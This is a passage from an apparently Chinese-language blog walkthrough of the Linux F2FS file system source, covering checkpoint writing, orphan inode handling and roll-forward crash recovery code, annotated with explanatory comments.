class="line">        type = CURSEG_HOT_NODE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果没有COMPACTED标识，则DATA和NODE都使用NORMAL的方式进行恢复</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (; type &lt;= CURSEG_COLD_NODE; type++)</span><br><span class="line">        <span class="keyword">if</span> (read_normal_summaries(sbi, type))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="read-normal-summaries-读取summaries"><a href="#read-normal-summaries-读取summaries" class="headerlink" title="read_normal_summaries //读取summaries"></a>read_normal_summaries //读取summaries</h6><p>这个函数对于F2FS的正常关闭，重新启动时读取的summary的方式都是类似的，都是根据HOT/WARM/COLD的顺序，读取对应的block，然后将数据保存到curseg对应的类型当中。这里<strong>重点考虑出现了宕机的情况的恢复</strong>。</p>
<hr>
<h2 id="checkpoint-c"><a href="#checkpoint-c" class="headerlink" title="checkpoint.c"></a>checkpoint.c</h2><h3 id="grab-meta-page-和-get-meta-page-获取元页面"><a href="#grab-meta-page-和-get-meta-page-获取元页面" class="headerlink" title="grab_meta_page 和 get_meta_page// 获取元页面"></a>grab_meta_page 和 get_meta_page// 获取元页面</h3><p>不同之处在于，<code>grab_meta_page</code>在返回给定缓存中给定索引处的锁定页面后，调用<code>wait_on_page_writeback</code>等待页面完成回写再<code>SetPageUptodate</code>更新页面，然后返回page<br>而<code>get_meta_page</code>，在返回给定缓存中给定索引处的锁定页面后，调用<code>mark_page_accessed</code>将页面标记为可访问，然后返回page</p>
<hr>
<p>f2fs_write_meta_page f2fs_write_meta_pages sync_meta_pages与写页面相关</p>
<hr>
<h3 id="f2fs-set-meta-page-dirty-设置元页面为脏"><a href="#f2fs-set-meta-page-dirty-设置元页面为脏" class="headerlink" title="f2fs_set_meta_page_dirty // 设置元页面为脏"></a>f2fs_set_meta_page_dirty // 设置元页面为脏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f2fs_set_meta_page_dirty</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> page-&gt;mapping;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(mapping-&gt;host-&gt;i_sb);</span><br><span class="line"></span><br><span class="line">    SetPageUptodate(page); <span class="comment">// 更新页面</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果该page不是脏页，则调用__set_page_dirty_nobuffers将页面设置为脏，但不是所有缓冲区都设置为脏</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!PageDirty(page)) &#123;</span><br><span class="line">        __set_page_dirty_nobuffers(page);</span><br><span class="line">        inc_page_count(sbi, F2FS_DIRTY_META);</span><br><span class="line">        F2FS_SET_SB_DIRT(sbi);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="check-orphan-space-检查孤立空间大小"><a href="#check-orphan-space-检查孤立空间大小" class="headerlink" title="check_orphan_space // 检查孤立空间大小"></a>check_orphan_space // 检查孤立空间大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_orphan_space</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_orphans;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 考虑段中的512个块，cp和log段摘要需要5个块</span></span><br><span class="line"><span class="comment">     * 剩余的块用于保留有限的orphan entries，为cp pack保留一个段，我们最多可以有1020 * 507个orphan entries</span></span><br><span class="line"><span class="comment">     * F2FS_ORPHANS_PER_BLOCK用于孤立索引节点的管理(#define F2FS_ORPHANS_PER_BLOCK 1020)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    max_orphans = (sbi-&gt;blocks_per_seg - <span class="number">5</span>) * F2FS_ORPHANS_PER_BLOCK;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 获取互斥量</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;n_orphans &gt;= max_orphans)</span><br><span class="line">    err = -ENOSPC;</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 释放此前被锁定的互斥量</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="add-orphan-inode"><a href="#add-orphan-inode" class="headerlink" title="add_orphan_inode"></a>add_orphan_inode</h3><h3 id="remove-orphan-inode"><a href="#remove-orphan-inode" class="headerlink" title="remove_orphan_inode"></a>remove_orphan_inode</h3><h3 id="recover-orphan-inode-恢复孤立索引节点"><a href="#recover-orphan-inode-恢复孤立索引节点" class="headerlink" title="recover_orphan_inode // 恢复孤立索引节点"></a>recover_orphan_inode // 恢复孤立索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_orphan_inode</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">nid_t</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> f2fs_iget(sbi-&gt;sb, ino); <span class="comment">// 获取元空间的索引节点</span></span><br><span class="line">    BUG_ON(IS_ERR(inode)); <span class="comment">// 查看 inode指针未指向最后一个page 时的堆栈内容</span></span><br><span class="line">    clear_nlink(inode); <span class="comment">// 直接将索引节点的链接数清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用iput截断所有数据 */</span></span><br><span class="line">    iput(inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-orphan-inodes"><a href="#recover-orphan-inodes" class="headerlink" title="recover_orphan_inodes"></a>recover_orphan_inodes</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recover_orphan_inodes</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">block_t</span> start_blk, orphan_blkaddr, i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果umount和journal_present标志值为0则直接return 0</span></span><br><span class="line">    <span class="keyword">if</span> (!(F2FS_CKPT(sbi)-&gt;ckpt_flags &amp; CP_ORPHAN_PRESENT_FLAG))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sbi-&gt;por_doing = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取块起始地址和orphan块地址</span></span><br><span class="line">    start_blk = __start_cp_addr(sbi) + <span class="number">1</span>;</span><br><span class="line">    orphan_blkaddr = __start_sum_addr(sbi) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; orphan_blkaddr; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> get_meta_page(sbi, start_blk + i);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_orphan_block</span> *<span class="title">orphan_blk</span>;</span></span><br><span class="line"></span><br><span class="line">        orphan_blk = (struct f2fs_orphan_block *)page_address(page);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; le32_to_cpu(orphan_blk-&gt;entry_count); j++) &#123;</span><br><span class="line">            <span class="keyword">nid_t</span> ino = le32_to_cpu(orphan_blk-&gt;ino[j]);</span><br><span class="line">            recover_orphan_inode(sbi, ino);</span><br><span class="line">        &#125;</span><br><span class="line">        f2fs_put_page(page, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* clear Orphan Flag */</span></span><br><span class="line">    F2FS_CKPT(sbi)-&gt;ckpt_flags &amp;= (~CP_ORPHAN_PRESENT_FLAG);</span><br><span class="line">    sbi-&gt;por_doing = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-valid-checkpoint-获取有效的checkpoint"><a href="#get-valid-checkpoint-获取有效的checkpoint" class="headerlink" title="get_valid_checkpoint // 获取有效的checkpoint"></a>get_valid_checkpoint // 获取有效的checkpoint</h3><p>在<code>f2fs_fill_super</code>中已介绍</p>
<h3 id="do-checkpoint"><a href="#do-checkpoint" class="headerlink" title="do_checkpoint"></a>do_checkpoint</h3><p>首先刷新所有的NAT/SIT页面，然后根据curseg修改checkpoint的信息和summary的信息。<br><strong>修改checkpoint</strong>：对<code>f2fs_checkpoint</code>的修改主要是把curseg的当前segno，blkoff等写入到<code>f2fs_checkpoint</code>中，以便下次重启时可以根据这些信息，重建curseg。  </p>
<p><strong>summary的回写</strong>：根据需要回写的summary的数目，返回需要写回的block的数目<code>data_sum_blocks</code>，如果data_sum_blocks = 1 或者 2，则表示回写1个或者2个block，则设置CP_COMPACT_SUM_FLAG标志。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data_sum_blocks = npages_for_summary_flush(sbi);</span><br><span class="line"><span class="keyword">if</span> (data_sum_blocks &lt; <span class="number">3</span>)</span><br><span class="line">    ckpt-&gt;ckpt_flags |= CP_COMPACT_SUM_FLAG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ckpt-&gt;ckpt_flags &amp;= (~CP_COMPACT_SUM_FLAG);</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">然后调用**write_data_summaries**将summary写入磁盘。  </span><br><span class="line">`write_data_summaries(sbi, start_blk);<span class="comment">//将data summary以及里面的journal写入磁盘`  </span></span><br><span class="line">`write_data_summaries`函数会判断一下是否设置了CP_COMPACT_SUM_FLAG标志，采取不同的方法写入磁盘。  </span><br><span class="line"></span><br><span class="line">### write_checkpoint <span class="comment">// 写checkpoint</span></span><br><span class="line"></span><br><span class="line">```<span class="function">c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">bool</span> blocked, <span class="keyword">bool</span> is_umount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">ckpt</span> =</span> F2FS_CKPT(sbi);<span class="comment">//从sbi读取当前cp的数据结构</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ckpt_ver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!blocked) &#123;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">    block_operations(sbi);<span class="comment">//将文件系统的所有操作停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *按照DATA, NODE, META的顺序将数据从page同步写入到磁盘</span></span><br><span class="line"><span class="comment">     *（META包括了SIT/NAT/checkpoint）</span></span><br><span class="line"><span class="comment">     *这里写入磁盘的meta并不是最新的meta</span></span><br><span class="line"><span class="comment">     *（可能是在此之前使用fsync/fdatasync时触发了checkpoint，meta还没有完全写入磁盘时起到阻塞的作用）</span></span><br><span class="line"><span class="comment">     *最新的meta还只保存在cache中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_submit_bio(sbi, DATA, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, NODE, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, META, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 完成数据的写入后更新更新版本号</span></span><br><span class="line"><span class="comment">     * 以便于SIT entries和seg summaries写入正确的位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ckpt_ver = le64_to_cpu(ckpt-&gt;checkpoint_ver);</span><br><span class="line">    ckpt-&gt;checkpoint_ver = cpu_to_le64(++ckpt_ver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更新元数据的NAT区域, SIT区域</span></span><br><span class="line"><span class="comment">     * 刷写所有nat entries, sit entries到磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    flush_nat_entries(sbi);</span><br><span class="line">    flush_sit_entries(sbi);</span><br><span class="line"></span><br><span class="line">    reset_victim_segmap(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlock all the fs_lock[] in do_checkpoint()</span></span><br><span class="line"><span class="comment">     * 调用do_checkpoint()将最新的元数据Checkpoint区域以及Summary区域写入磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    do_checkpoint(sbi, is_umount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复文件系统的操作</span></span><br><span class="line">    unblock_operations(sbi);</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="recovery-c"><a href="#recovery-c" class="headerlink" title="recovery.c"></a>recovery.c</h2><h3 id="space-for-roll-forward-是否可以前滚回复"><a href="#space-for-roll-forward-是否可以前滚回复" class="headerlink" title="space_for_roll_forward // 是否可以前滚回复"></a>space_for_roll_forward // 是否可以前滚回复</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">space_for_roll_forward</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 最后有效块数与分配有效块数之和小于等于用户块数，返回true</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;last_valid_block_count + sbi-&gt;alloc_valid_block_count</span><br><span class="line">        &gt; sbi-&gt;user_block_count)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-fsync-inode-获取fsync索引节点"><a href="#get-fsync-inode-获取fsync索引节点" class="headerlink" title="get_fsync_inode // 获取fsync索引节点"></a>get_fsync_inode // 获取fsync索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个entry(获取fsync索引节点)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fsync_inode_entry *<span class="title">get_fsync_inode</span><span class="params">(struct list_head *head,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">nid_t</span> ino)</span> <span class="comment">// typedef u32 nid_t</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">this</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历列表，struct list_head做循环游标，head为列表头</span></span><br><span class="line">    list_for_each(<span class="keyword">this</span>, head) &#123;</span><br><span class="line">        <span class="comment">// 获取目录项的结构</span></span><br><span class="line">        entry = list_entry(<span class="keyword">this</span>, struct fsync_inode_entry, <span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// entry指向vfs inode指针指向的结构体inode中的子数据i_ino与给定ino(inode number)相等则返回目录项</span></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;inode-&gt;i_ino == ino)</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-dentry-恢复目录项"><a href="#recover-dentry-恢复目录项" class="headerlink" title="recover_dentry // 恢复目录项"></a>recover_dentry // 恢复目录项</h3><figure class="highlight plaintext"><figcaption><span>恢复目录项</span></figcaption><table><tr><td class="code"><pre><span class="line">static int recover_dentry(struct page *ipage, struct inode *inode)</span><br><span class="line">&#123;</span><br><span class="line">    // kmap函数将分配到的高端内存映射到永久内存映射区域</span><br><span class="line">    struct f2fs_node *raw_node = (struct f2fs_node *)kmap(ipage);</span><br><span class="line">    struct f2fs_inode *raw_inode = &amp;(raw_node-&gt;i);</span><br><span class="line">    struct dentry dent, parent;</span><br><span class="line">    struct f2fs_dir_entry *de;</span><br><span class="line">    struct page *page;</span><br><span class="line">    struct inode *dir;</span><br><span class="line">    int err = 0;</span><br><span class="line"></span><br><span class="line">    if (!raw_node-&gt;footer.dentry)</span><br><span class="line">        goto out;</span><br><span class="line"></span><br><span class="line">    // 获取inode所属文件的超级块指针和父索引节点号</span><br><span class="line">    dir = f2fs_iget(inode-&gt;i_sb, le32_to_cpu(raw_inode-&gt;i_pino));</span><br><span class="line">    if (IS_ERR(dir)) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        goto out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent.d_inode = dir; // 与该目录项关联的inode</span><br><span class="line">    dent.d_parent = &amp;parent; // 父目录的目录项</span><br><span class="line"></span><br><span class="line">    // 目录项名称</span><br><span class="line">    dent.d_name.len = le32_to_cpu(raw_inode-&gt;i_namelen);</span><br><span class="line">    dent.d_name.name = raw_inode-&gt;i_name;</span><br><span class="line"></span><br><span class="line">    // 根据以上信息找到目录项</span><br><span class="line">    de = f2fs_find_entry(dir, &amp;dent.d_name, &amp;page);</span><br><span class="line">    if (de) &#123;</span><br><span class="line">        kunmap(page);</span><br><span class="line">        f2fs_put_page(page, 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        f2fs_add_link(&amp;dent, inode);</span><br><span class="line">    &#125;</span><br><span class="line">    iput(dir);</span><br><span class="line">out:</span><br><span class="line">    kunmap(ipage);</span><br><span class="line">    return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="recover-inode-恢复inode"><a href="#recover-inode-恢复inode" class="headerlink" title="recover_inode // 恢复inode"></a>recover_inode // 恢复inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">recover_inode</span><span class="params">(struct inode *inode, struct page *node_page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取节点页面的映射虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *kaddr = page_address(node_page);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_node</span> *<span class="title">raw_node</span> =</span> (struct f2fs_node *)kaddr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode</span> *<span class="title">raw_inode</span> =</span> &amp;(raw_node-&gt;i);</span><br><span class="line"></span><br><span class="line">    inode-&gt;i_mode = le32_to_cpu(raw_inode-&gt;i_mode); <span class="comment">//  文件类型和访问权限</span></span><br><span class="line">    i_size_write(inode, le64_to_cpu(raw_inode-&gt;i_size)); <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    inode-&gt;i_atime.tv_sec = le32_to_cpu(raw_inode-&gt;i_atime); <span class="comment">// 文件最后一次访问时间</span></span><br><span class="line">    inode-&gt;i_ctime.tv_sec = le32_to_cpu(raw_inode-&gt;i_ctime); <span class="comment">// inode最后一次修改时间</span></span><br><span class="line">    inode-&gt;i_mtime.tv_sec = le32_to_cpu(raw_inode-&gt;i_mtime); <span class="comment">// 文件最后一次修改时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> recover_dentry(node_page, inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode"><a href="#find-fsync-dnodes-找到所有的可以恢复的dnode对应的inode" class="headerlink" title="find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode"></a>find_fsync_dnodes // 找到所有的可以恢复的dnode对应的inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">find_fsync_dnodes</span><span class="params">(struct f2fs_sb_info *sbi, struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);<span class="comment">// cp版本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取当前段的节点页面</span></span><br><span class="line"><span class="comment">     * CURSEG_I因为是基于dnode进行恢复，因此是WARM NODE</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, CURSEG_WARM_NODE);</span><br><span class="line">    blkaddr = START_BLOCK(sbi, curseg-&gt;segno) + curseg-&gt;next_blkoff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读页面 */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(page);</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page)) <span class="comment">// 比较从cp版本</span></span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_fsync_dnode(page)) <span class="comment">// 前滚恢复只能恢复被fsync的node page</span></span><br><span class="line">            <span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果是NULL，则表示inode不在list中</span></span><br><span class="line"><span class="comment">         * 如不是NULL，则表示这个inode已经在list中，不需要加入了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">            <span class="keyword">if</span> (entry) &#123;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">                <span class="comment">// 如果是dentry的inode，则先恢复</span></span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page))</span><br><span class="line">                    set_inode_flag(F2FS_I(entry-&gt;inode),</span><br><span class="line">                                            FI_INC_LINK);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (IS_INODE(page) &amp;&amp; is_dent_dnode(page)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (recover_inode_page(sbi, page)) &#123;</span><br><span class="line">                        err = -ENOMEM;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* add this fsync inode to the list */</span></span><br><span class="line">                entry = kmem_cache_alloc(fsync_entry_slab, GFP_NOFS);</span><br><span class="line">                <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">                    err = -ENOMEM;</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                INIT_LIST_HEAD(&amp;entry-&gt;<span class="built_in">list</span>);</span><br><span class="line">                list_add_tail(&amp;entry-&gt;<span class="built_in">list</span>, head);</span><br><span class="line"></span><br><span class="line">                entry-&gt;inode = f2fs_iget(sbi-&gt;sb, ino_of_node(page));</span><br><span class="line">                <span class="keyword">if</span> (IS_ERR(entry-&gt;inode)) &#123;</span><br><span class="line">                    err = PTR_ERR(entry-&gt;inode);</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                entry-&gt;blkaddr = blkaddr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (IS_INODE(page)) &#123;</span><br><span class="line">                err = recover_inode(entry-&gt;inode, page);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">next:</span><br><span class="line">            <span class="comment">/* check next segment */</span></span><br><span class="line">            blkaddr = next_blkaddr_of_node(page);</span><br><span class="line">            ClearPageUptodate(page);</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    unlock_page(page);</span><br><span class="line">    __free_pages(page, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="destroy-fsync-dnodes-销毁fsync-dnodes"><a href="#destroy-fsync-dnodes-销毁fsync-dnodes" class="headerlink" title="destroy_fsync_dnodes // 销毁fsync dnodes"></a>destroy_fsync_dnodes // 销毁fsync dnodes</h3><h3 id="check-index-in-prev-nodes-检查前向节点的索引"><a href="#check-index-in-prev-nodes-检查前向节点的索引" class="headerlink" title="check_index_in_prev_nodes // 检查前向节点的索引"></a>check_index_in_prev_nodes // 检查前向节点的索引</h3><h3 id="do-recover-data-恢复data-page和node-page"><a href="#do-recover-data-恢复data-page和node-page" class="headerlink" title="do_recover_data // 恢复data page和node page"></a>do_recover_data // 恢复data page和node page</h3><blockquote>
<p>首先调用<code>start_bidx_of_node</code>函数，把当前node page的起始块索引赋给start<br><code>set_new_dnode</code>建立一个vfs dnode，<code>get_dnode_of_data</code>初始化刚刚建立的dnode相关信息。<br><code>wait_on_page_writeback</code>等待页面回写<br><code>get_node_info</code>从node page获取节点信息<br><code>datablock_addr</code>获取文件名和索引<br><code>check_index_in_prev_nodes</code>检查具有以上获取的索引的前向节点<br>通过调用<code>recover_data_page</code>和<code>update_extent_cache</code>写入虚拟数据页<br>调用<code>recover_node_page</code>恢复node page</p>
</blockquote>
<h3 id="recover-data-恢复数据"><a href="#recover-data-恢复数据" class="headerlink" title="recover_data // 恢复数据"></a>recover_data // 恢复数据</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_data</span><span class="params">(struct f2fs_sb_info *sbi,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct list_head *head, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_ver = le64_to_cpu(sbi-&gt;ckpt-&gt;checkpoint_ver);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">curseg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">block_t</span> blkaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get node pages in the current segment */</span></span><br><span class="line">    curseg = CURSEG_I(sbi, type);</span><br><span class="line">    blkaddr = NEXT_FREE_BLKADDR(sbi, curseg);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read node page */</span></span><br><span class="line">    page = alloc_page(GFP_NOFS | __GFP_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(page))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lock_page(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f2fs_readpage(sbi, page, blkaddr, READ_SYNC))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cp_ver != cpver_of_node(page))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从inodelist中取出一个entry</span></span><br><span class="line">        entry = get_fsync_inode(head, ino_of_node(page));</span><br><span class="line">        <span class="keyword">if</span> (!entry)</span><br><span class="line">            <span class="keyword">goto</span> 